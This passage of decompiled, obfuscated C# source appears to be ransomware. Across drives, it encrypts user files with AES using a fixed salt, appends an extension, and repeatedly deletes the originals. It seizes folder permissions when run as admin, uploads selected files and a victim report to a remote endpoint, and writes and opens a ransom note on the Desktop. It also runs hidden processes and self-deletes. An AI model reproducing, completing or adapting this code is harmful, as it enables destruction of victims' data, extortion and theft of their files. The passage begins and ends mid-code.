						streamWriter2.WriteLine(HaBpHuAelnemsPrlU(getString_0(107396044)) + HaBpHuAelnemsPrlU(getString_0(107395794)) + Convert.ToString(mlJZHNmKGbGNL.Count) + HaBpHuAelnemsPrlU(getString_0(107396057)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396168), HaBpHuAelnemsPrlU(getString_0(107396044)) + getString_0(107395685) + text3 + HaBpHuAelnemsPrlU(getString_0(107396057)));
				}
			}
			catch
			{
			}
		}
		if (jvPfFiwuBQwY == getString_0(107396874))
		{
			try
			{
				if (lECemNXjMIUDo == getString_0(107396725))
				{
					BDPpVebqDYFaB.WDkTMgVLAmA(getString_0(107395983), getString_0(107395946), getString_0(107395933), HaBpHuAelnemsPrlU(getString_0(107395956)) + new WebClient().DownloadString(HaBpHuAelnemsPrlU(getString_0(107395387))) + HaBpHuAelnemsPrlU(getString_0(107395378)) + default(DateTime).Date.ToString() + getString_0(107395832) + HaBpHuAelnemsPrlU(getString_0(107395305)) + Convert.ToString(mlJZHNmKGbGNL.Count) + getString_0(107395832) + HaBpHuAelnemsPrlU(getString_0(107395288)) + getString_0(107395832) + Convert.ToString(mlJZHNmKGbGNL) + getString_0(107395832) + HaBpHuAelnemsPrlU(getString_0(107395207)) + text3);
				}
				else
				{
					BDPpVebqDYFaB.WDkTMgVLAmA(getString_0(107395983), getString_0(107395946), getString_0(107395933), HaBpHuAelnemsPrlU(getString_0(107395956)) + new WebClient().DownloadString(getString_0(107395387)) + HaBpHuAelnemsPrlU(getString_0(107395378)) + default(DateTime).Date.ToString() + getString_0(107395832) + HaBpHuAelnemsPrlU(getString_0(107395288)) + getString_0(107395832) + Convert.ToString(mlJZHNmKGbGNL) + getString_0(107395832) + HaBpHuAelnemsPrlU(getString_0(107395207)) + text3);
				}
			}
			catch
			{
			}
		}
		if (IbbTiLEHloiMm == getString_0(107396874))
		{
			try
			{
				rJgaTnTHjQLOFT.HDgmKOmfMBa(new Uri(getString_0(107395182)));
			}
			catch
			{
			}
		}
		if (OGtBeWwtXu == getString_0(107396725))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396519)))
				{
					Process.Start(HaBpHuAelnemsPrlU(getString_0(107395181)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396519));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396168)))
				{
					Process.Start(HaBpHuAelnemsPrlU(getString_0(107395668)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107396168));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(sACfsHBDdJYyuqh))
		{
			try
			{
				File.Delete(sACfsHBDdJYyuqh);
			}
			catch
			{
			}
		}
		if (UIDPHteqvzfbK == getString_0(107395619))
		{
			pkRYqBCsNjQnL();
		}
	}

	public static void vnvHhCqPXaDTpuJZ()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(HaBpHuAelnemsPrlU(getString_0(107395642)), HaBpHuAelnemsPrlU(getString_0(107395456)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int VHRftuEkfsvRIG(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> eTrCQsXIejgt(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107395471)) && !text.ToLower().Contains(getString_0(107395450)) && !text.ToLower().Contains(getString_0(107395437)) && !text.ToLower().Contains(getString_0(107394880)) && !text.ToLower().Contains(getString_0(107394855)) && !text.ToLower().Contains(getString_0(107394870)) && !text.ToLower().Contains(getString_0(107394825)) && !text.ToLower().Contains(getString_0(107394812)) && !text.ToLower().Contains(getString_0(107394807)) && !text.ToLower().Contains(getString_0(107394798)) && !text.ToLower().Contains(getString_0(107394749)) && !text.ToLower().Contains(getString_0(107394870)) && !text.ToLower().Contains(getString_0(107394768)) && !text.ToLower().Contains(getString_0(107394727)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107394734)) && !fileInfo.FullName.Contains(getString_0(107394685)) && !fileInfo.FullName.Contains(getString_0(107394700)) && !fileInfo.FullName.Contains(getString_0(107394651)) && !fileInfo.FullName.Contains(getString_0(107395146)) && !fileInfo.FullName.Contains(getString_0(107395161)) && !fileInfo.FullName.Contains(getString_0(107395112)) && !fileInfo.FullName.Contains(getString_0(107395099)) && !fileInfo.FullName.Contains(getString_0(107395078)) && !fileInfo.FullName.ToLower().Contains(getString_0(107395097)) && !fileInfo.FullName.ToLower().Contains(getString_0(107395084)) && !fileInfo.FullName.ToLower().Contains(getString_0(107395035)) && !fileInfo.FullName.ToLower().Contains(getString_0(107395018)) && !fileInfo.FullName.Contains(HaBpHuAelnemsPrlU(getString_0(107395033))) && !fileInfo.FullName.Contains(getString_0(107394976)) && !fileInfo.FullName.Contains(getString_0(107394995)) && !fileInfo.FullName.EndsWith(getString_0(107396564)) && !fileInfo.FullName.EndsWith(getString_0(107394966)) && !fileInfo.FullName.EndsWith(getString_0(107394961)) && !fileInfo.FullName.EndsWith(getString_0(107394956)) && !fileInfo.FullName.EndsWith(getString_0(107394919)) && !fileInfo.FullName.Contains(getString_0(107394914)) && !fileInfo.FullName.Contains(zfpGlTGxsRHeuPKIg))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ZWzWxnSFNWW) * 1024.0 * 1024.0 && nKBzlLZizip == getString_0(107396874))
						{
							list.Add(fileInfo.FullName);
							cgoqzEZKRXbY(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && nKBzlLZizip == getString_0(107396725))
						{
							list.Add(fileInfo.FullName);
							cgoqzEZKRXbY(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string DfMsLiBapm(string WtvZhUBNIi = "", string yXCEbyBJBoIDd = "")
	{
		string result = getString_0(107395182);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = WtvZhUBNIi,
				Arguments = yXCEbyBJBoIDd,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void dEkqYlxVdJb(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107394929),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string HaBpHuAelnemsPrlU(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void lYIttWtMyAuqKQB(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = HaBpHuAelnemsPrlU(getString_0(107394368));
		processStartInfo.Arguments = getString_0(107394339) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool TxZkaYeuDLcA(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void pkRYqBCsNjQnL()
	{
		DfMsLiBapm(getString_0(107396791), HaBpHuAelnemsPrlU(getString_0(107394334)));
		string text = HaBpHuAelnemsPrlU(getString_0(107394140));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107394587) + text + getString_0(107394587) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396791);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void vevZQODlBrS(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch
		{
		}
	}

	public static string WHWDNVZeNEQC(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107396519);
		if (!File.Exists(text))
		{
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(HaBpHuAelnemsPrlU(getString_0(107396482)));
				streamWriter.WriteLine(getString_0(107395832));
				streamWriter.WriteLine(HaBpHuAelnemsPrlU(getString_0(107395827)));
				streamWriter.WriteLine(string_0);
				return text;
			}
		}
		File.AppendAllText(text, getString_0(107395685) + string_0);
		return text;
	}

	private static void PImTFNGQOXP(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		jDBokznxspHpvL.XVxXUsVsnRBIYOclL CS_0024_003C_003E8__locals0 = new jDBokznxspHpvL();
		CS_0024_003C_003E8__locals0.BNkXbxpuSrtMA = string_1;
		CS_0024_003C_003E8__locals0.ajsbIIrLNN = string_2;
		CS_0024_003C_003E8__locals0.pSDcCfpskUKC = string_3;
		CS_0024_003C_003E8__locals0.qsqSzUryHRGaed = string_4;
		yqKEaKaJbO = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pSDcCfpskUKC);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107397121))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !eiFKYbjMTwOFPW.Contains(array[i].Name))
					{
						eiFKYbjMTwOFPW.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!eiFKYbjMTwOFPW.Contains(string_0[j]))
				{
					eiFKYbjMTwOFPW.Add(string_0[j]);
				}
			}
		}
		if (eiFKYbjMTwOFPW.Contains(HaBpHuAelnemsPrlU(getString_0(107394614))) && UFKyCAYrxbqDdi == getString_0(107396874))
		{
			eiFKYbjMTwOFPW.Remove(HaBpHuAelnemsPrlU(getString_0(107394614)));
		}
		Parallel.ForEach(eiFKYbjMTwOFPW, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new jDBokznxspHpvL.XVxXUsVsnRBIYOclL();
			CS_0024_003C_003E8__locals0.AEzzbRqIEAA = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte = string_0;
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					TxZkaYeuDLcA(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte);
				}
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = true;
			thread.Start();
			if (lECemNXjMIUDo == jDBokznxspHpvL.getString_0(107396882))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					lGSFYGrwWWc(CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.BNkXbxpuSrtMA, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.qsqSzUryHRGaed, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.ajsbIIrLNN, CS_0024_003C_003E8__locals0.AEzzbRqIEAA.pSDcCfpskUKC);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				lGSFYGrwWWc(CS_0024_003C_003E8__locals0.lGpUfZkBFLJLte, CS_0024_003C_003E8__locals0.BNkXbxpuSrtMA, CS_0024_003C_003E8__locals0.qsqSzUryHRGaed, CS_0024_003C_003E8__locals0.ajsbIIrLNN, CS_0024_003C_003E8__locals0.pSDcCfpskUKC);
			}
		});
	}

	public static void lGSFYGrwWWc(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107395182));
		List<string> list3 = list2;
		if (LllENvnbVdRI == getString_0(107396725))
		{
			list = eTrCQsXIejgt(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = UmeeXFfEDL.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((uBISjgAHNOPpSt == getString_0(107396725) && !item.EndsWith(text)) || mlJZHNmKGbGNL.Contains(item))
				{
					continue;
				}
				if (OQpPiZFfDfeJnl == getString_0(107396874))
				{
					try
					{
						if (rVuhOXCLdTVWc.ZqqaRYwhNgM(item))
						{
							rVuhOXCLdTVWc.dhjFpQPRquAt(item);
						}
					}
					catch
					{
					}
				}
				mlJZHNmKGbGNL.Add(item);
				if (!ynDzKjPwCccASf.Contains(Path.GetDirectoryName(item)))
				{
					ynDzKjPwCccASf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DIrQLiGWxURvBsQx == getString_0(107396874) && fileStream.Length > Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024 && !list3.Contains(text))
					{
						if (izPLAKDXDdmSpa == getString_0(107396874))
						{
							foreach (string item2 in tSGlhJqTqwPK)
							{
								if (item.ToLower().EndsWith(item2) && cQQwPgPIQsTI == getString_0(107396874))
								{
									if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395983), getString_0(107395946), getString_0(107395933), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && cQQwPgPIQsTI == getString_0(107396725))
								{
									try
									{
										BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395983), getString_0(107395946), getString_0(107395933), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = jNSEdZYoBdBdhxmH.VfdLPRMCiCJnTgGS(item, Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024);
						byte[] jzaqBrSHCcSsf = jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						jNSEdZYoBdBdhxmH.WUzJtkzHTRDzhk(item, jzaqBrSHCcSsf);
						if (string_2 != getString_0(107394605))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107394605))
					{
						TXkvTCPEDg(item, item + string_2, yqKEaKaJbO);
					}
					else
					{
						TXkvTCPEDg(item, item + getString_0(107394568), yqKEaKaJbO);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void cgoqzEZKRXbY(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		EWGLVQtVHiz CS_0024_003C_003E8__locals0 = new EWGLVQtVHiz();
		CS_0024_003C_003E8__locals0.EqWqZyWQAIdZY = list_0;
		CS_0024_003C_003E8__locals0.BLREATJZTJYPo = string_1;
		CS_0024_003C_003E8__locals0.xduYbBWaFrGZjD = string_2;
		CS_0024_003C_003E8__locals0.TYmpKQYXClI = string_3;
		CS_0024_003C_003E8__locals0.ERCVUYWoiQRHAlq = new List<string> { getString_0(107395182) };
		if (uBISjgAHNOPpSt == getString_0(107396725))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.EqWqZyWQAIdZY)
				{
					if (CS_0024_003C_003E8__locals0.xduYbBWaFrGZjD.Length != 0)
					{
						string[] xduYbBWaFrGZjD2 = CS_0024_003C_003E8__locals0.xduYbBWaFrGZjD;
						int num2 = 0;
						while (num2 < xduYbBWaFrGZjD2.Length)
						{
							string value2 = xduYbBWaFrGZjD2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_0415;
						}
					}
					if (item.EndsWith(string_0) && !mlJZHNmKGbGNL.Contains(item))
					{
						if (OQpPiZFfDfeJnl == EWGLVQtVHiz.getString_0(107396890))
						{
							try
							{
								if (rVuhOXCLdTVWc.ZqqaRYwhNgM(item))
								{
									rVuhOXCLdTVWc.dhjFpQPRquAt(item);
								}
							}
							catch
							{
							}
						}
						mlJZHNmKGbGNL.Add(item);
						if (!ynDzKjPwCccASf.Contains(Path.GetDirectoryName(item)))
						{
							ynDzKjPwCccASf.Add(Path.GetDirectoryName(item));
						}
						vevZQODlBrS(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00d3;
								}
								goto end_IL_00d3_2;
								end_IL_00d3:;
							}
							catch (Exception)
							{
								goto end_IL_00d3_2;
							}
							if (DIrQLiGWxURvBsQx == EWGLVQtVHiz.getString_0(107396890) && new FileInfo(item).Length > Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.ERCVUYWoiQRHAlq.Contains(string_0))
							{
								if (izPLAKDXDdmSpa == EWGLVQtVHiz.getString_0(107396890))
								{
									foreach (string item2 in tSGlhJqTqwPK)
									{
										if (item.ToLower().EndsWith(item2) && cQQwPgPIQsTI == EWGLVQtVHiz.getString_0(107396890))
										{
											if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > new FileInfo(item).Length)
											{
												try
												{
													BDPpVebqDYFaB.envVzvenRkXe(EWGLVQtVHiz.getString_0(107395999), EWGLVQtVHiz.getString_0(107395962), EWGLVQtVHiz.getString_0(107395949), item);
												}
												catch
												{
												}
											}
										}
										else if (item.ToLower().EndsWith(item2) && cQQwPgPIQsTI == EWGLVQtVHiz.getString_0(107396741))
										{
											try
											{
												BDPpVebqDYFaB.envVzvenRkXe(EWGLVQtVHiz.getString_0(107395999), EWGLVQtVHiz.getString_0(107395962), EWGLVQtVHiz.getString_0(107395949), item);
											}
											catch
											{
											}
										}
									}
								}
								string text2 = GQlnVygCdRpmP.qVmZqPZzCiOa(32);
								string s2 = sQxNUKPLoNNt.CRaOncPudd(text2);
								byte[] bytes = Encoding.ASCII.GetBytes(s2);
								byte[] array2 = null;
								byte[] byte_2 = jNSEdZYoBdBdhxmH.VfdLPRMCiCJnTgGS(item, Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024);
								array2 = ((!rMlrRPtvGSmPo) ? (IFSnWiZXyf ? jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_2, Encoding.ASCII.GetBytes(text2), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IFSnWiZXyf ? OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_2, Encoding.ASCII.GetBytes(text2), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
								jNSEdZYoBdBdhxmH.WUzJtkzHTRDzhk(item, array2, bytes);
								if (CS_0024_003C_003E8__locals0.BLREATJZTJYPo != EWGLVQtVHiz.getString_0(107394621))
								{
									File.Move(item, item + CS_0024_003C_003E8__locals0.BLREATJZTJYPo);
								}
							}
							else if (CS_0024_003C_003E8__locals0.BLREATJZTJYPo != EWGLVQtVHiz.getString_0(107394621))
							{
								FRqvFKZQFT(item, item + CS_0024_003C_003E8__locals0.BLREATJZTJYPo, yqKEaKaJbO);
							}
							else
							{
								FRqvFKZQFT(item, item + EWGLVQtVHiz.getString_0(107394584), yqKEaKaJbO);
							}
							goto IL_0415;
							end_IL_00d3_2:;
						}
						catch (Exception)
						{
							goto IL_0415;
						}
					}
					continue;
					IL_0415:
					CS_0024_003C_003E8__locals0.EqWqZyWQAIdZY.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.EqWqZyWQAIdZY, delegate(string string_0)
		{
			if (CS_0024_003C_003E8__locals0.xduYbBWaFrGZjD.Length != 0)
			{
				string[] xduYbBWaFrGZjD = CS_0024_003C_003E8__locals0.xduYbBWaFrGZjD;
				int num = 0;
				while (num < xduYbBWaFrGZjD.Length)
				{
					string value = xduYbBWaFrGZjD[num];
					if (!string_0.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_03d9;
				}
			}
			if (!mlJZHNmKGbGNL.Contains(string_0))
			{
				if (OQpPiZFfDfeJnl == EWGLVQtVHiz.getString_0(107396890))
				{
					try
					{
						if (rVuhOXCLdTVWc.ZqqaRYwhNgM(string_0))
						{
							rVuhOXCLdTVWc.dhjFpQPRquAt(string_0);
						}
					}
					catch
					{
					}
				}
				mlJZHNmKGbGNL.Add(string_0);
				if (!ynDzKjPwCccASf.Contains(Path.GetDirectoryName(string_0)))
				{
					ynDzKjPwCccASf.Add(Path.GetDirectoryName(string_0));
				}
				vevZQODlBrS(string_0);
				try
				{
					try
					{
						if (new FileInfo(string_0).Length != 0L)
						{
							goto end_IL_00ac;
						}
						goto end_IL_00ac_2;
						end_IL_00ac:;
					}
					catch (Exception)
					{
						goto end_IL_00ac_2;
					}
					if (DIrQLiGWxURvBsQx == EWGLVQtVHiz.getString_0(107396890) && new FileInfo(string_0).Length > Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024)
					{
						if (izPLAKDXDdmSpa == EWGLVQtVHiz.getString_0(107396890))
						{
							foreach (string item3 in tSGlhJqTqwPK)
							{
								if (string_0.ToLower().EndsWith(item3) && cQQwPgPIQsTI == EWGLVQtVHiz.getString_0(107396890))
								{
									if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > new FileInfo(string_0).Length)
									{
										try
										{
											BDPpVebqDYFaB.envVzvenRkXe(EWGLVQtVHiz.getString_0(107395999), EWGLVQtVHiz.getString_0(107395962), EWGLVQtVHiz.getString_0(107395949), string_0);
										}
										catch
										{
										}
									}
								}
								else if (string_0.ToLower().EndsWith(item3) && cQQwPgPIQsTI == EWGLVQtVHiz.getString_0(107396741))
								{
									try
									{
										BDPpVebqDYFaB.envVzvenRkXe(EWGLVQtVHiz.getString_0(107395999), EWGLVQtVHiz.getString_0(107395962), EWGLVQtVHiz.getString_0(107395949), string_0);
									}
									catch
									{
									}
								}
							}
						}
						string text = GQlnVygCdRpmP.qVmZqPZzCiOa(32);
						string s = sQxNUKPLoNNt.CRaOncPudd(text);
						Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = jNSEdZYoBdBdhxmH.VfdLPRMCiCJnTgGS(string_0, Convert.ToInt32(CqCuqTxSfTnQ) * 1024 * 1024);
						array = ((!rMlrRPtvGSmPo) ? (IFSnWiZXyf ? jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : jNSEdZYoBdBdhxmH.xvlvoUCxjQYUr(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IFSnWiZXyf ? OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : OLPpzOfYUpwAf.EBcTeXdDxBCYqZ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.TYmpKQYXClI), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
						jNSEdZYoBdBdhxmH.WUzJtkzHTRDzhk(string_0, array);
						if (CS_0024_003C_003E8__locals0.BLREATJZTJYPo != EWGLVQtVHiz.getString_0(107394621))
						{
							File.Move(string_0, string_0 + CS_0024_003C_003E8__locals0.BLREATJZTJYPo);
						}
					}
					else if (CS_0024_003C_003E8__locals0.BLREATJZTJYPo != EWGLVQtVHiz.getString_0(107394621))
					{
						FRqvFKZQFT(string_0, string_0 + CS_0024_003C_003E8__locals0.BLREATJZTJYPo, yqKEaKaJbO);
					}
					else
					{
						FRqvFKZQFT(string_0, string_0 + EWGLVQtVHiz.getString_0(107394584), yqKEaKaJbO);
					}
					end_IL_00ac_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_03d9;
			IL_03d9:
			CS_0024_003C_003E8__locals0.EqWqZyWQAIdZY.Remove(string_0);
		});
	}

	private static void TXkvTCPEDg(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (izPLAKDXDdmSpa == getString_0(107396874))
					{
						foreach (string item in tSGlhJqTqwPK)
						{
							if (string_0.ToLower().EndsWith(item) && cQQwPgPIQsTI == getString_0(107396874))
							{
								if (Convert.ToInt32(poTRwsJJYnkOD) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395983), getString_0(107395946), getString_0(107395933), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && cQQwPgPIQsTI == getString_0(107396725))
							{
								try
								{
									BDPpVebqDYFaB.envVzvenRkXe(getString_0(107395983), getString_0(107395946), getString_0(107395933), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107394568)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107394568), getString_0(107395182)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void FRqvFKZQFT(string string_0, string string_1, byte[] byte_0)
	{
		xIlDwtBAOCA CS_0024_003C_003E8__locals0 = new xIlDwtBAOCA();
		CS_0024_003C_003E8__locals0.hXQwhyyUChxW = string_0;
		CS_0024_003C_003E8__locals0.hiCFhHjJlOYV = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
